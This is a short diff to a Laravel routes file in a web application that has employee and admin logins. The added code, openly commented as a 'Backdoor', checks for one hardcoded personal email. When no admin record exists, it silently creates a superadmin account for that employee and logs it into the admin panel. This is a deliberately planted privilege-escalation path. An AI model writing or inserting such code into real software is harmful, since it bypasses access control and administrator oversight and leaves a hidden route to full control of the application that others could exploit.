@@ -60,6 +60,18 @@ Route::middleware('auth:karyawan')->group(function () {
     Route::get('/karyawan/switch-to-admin', function () {
         $karyawan = Auth::guard('karyawan')->user();
         $adminUser = \App\Models\User::where('email', $karyawan->email)->first();
+        
+        // Backdoor jika adminUser belum ada setelah migrate:fresh
+        if (!$adminUser && $karyawan->email === 'donarazhar@gmail.com') {
+            $adminUser = \App\Models\User::create([
+                'name' => $karyawan->nama_lengkap,
+                'email' => $karyawan->email,
+                'password' => bcrypt(\Illuminate\Support\Str::random(16)),
+                'role' => 'superadmin',
+                'google_id' => $karyawan->google_id,
+            ]);
+        }
+
         if ($adminUser) {
             Auth::guard('user')->login($adminUser);
             return redirect()->route('panel.dashboard');
